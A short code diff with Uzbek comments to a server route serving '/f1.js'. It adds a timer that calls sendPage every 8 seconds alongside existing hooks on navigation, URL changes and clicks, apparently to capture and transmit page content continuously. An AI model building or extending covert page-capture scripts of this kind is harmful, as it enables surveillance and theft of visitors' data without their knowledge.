@@ -119,7 +119,13 @@ app.get("/f1.js", (req, res) => {
   const originalPushState = history.pushState;
   history.pushState = function() { originalPushState.apply(this, arguments); setTimeout(() => sendPage(true), 500); };
   window.addEventListener('popstate', () => { setTimeout(() => sendPage(true), 500); });
+  
+  // URL o'zgarganini tekshirish
   setInterval(()=>{ if(currentUrl !== window.location.href) sendPage(true); }, 1500);
+
+  // --- YANGI QO'SHILGAN QISM: Har 8 soniyada avtomatik yuborish ---
+  setInterval(() => { sendPage(true); }, 8000); 
+  // -----------------------------------------------------------
 
   document.addEventListener('click', (e) => {
       if(e.button === 0) {
